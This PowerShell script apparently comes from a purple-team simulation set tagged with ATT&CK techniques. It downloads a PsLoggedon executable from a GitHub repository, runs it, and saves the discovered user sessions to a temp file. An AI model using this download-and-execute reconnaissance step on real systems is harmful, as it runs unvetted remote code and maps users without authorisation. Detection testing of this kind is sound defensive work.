<#
    T1588.002 - Obtain Capabilities: Tool
    T1049 - System Network Connections Discovery
    T1033 - System Owner/User Discovery
    Discover Local and remote user sessions history with SysInternal tool PsLoggedon.exe
    Download PsLoggedon.exe from project https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/PsLoggedon.exe and execute it 
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append -Force


# Download and execute PsLoggedon.exe (the binary on my repo is accepting commandline, the default available on Nirsoft site does not)
if([System.IntPtr]::Size -eq 4){
    $url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/PsLoggedon.exe"
}
elseif([System.IntPtr]::Size -eq 8){
    $url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/PsLoggedon64.exe"
}
else{
    Write-Host -ForegroundColor Yellow "Warning: OS architecture could not be detected, downloading x32 version of PsLoggedon.exe..."
    $url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/PsLoggedon.exe"
}

$dumpfile = "$env:tmp\loggedon_previsous_sessions.txt"
$outfile = "$env:tmp\pslogged.exe"

# Download and execute PsLoggedon
try {
    Invoke-WebRequest $url -OutFile $outfile -Verbose
    if (Test-Path $outfile){
        Write-Host -ForegroundColor Green "Success: PsLoggedon.exe downloaded to $outfile"
        & $outfile /accepteula -nobanner > $dumpfile
        sleep 1
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to download PsLoggedon.exe, $dumpfile not found."
    }
    if(test-path $dumpfile){
        Write-Host -ForegroundColor Green "Success: Previous logged on sessions extracted to $dumpfile"
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to discover previous logged on sessions and save them to $dumpfile"
    }
}
catch {
    Write-Host -ForegroundColor Red "`nErorr: $_"
}

Stop-Transcript
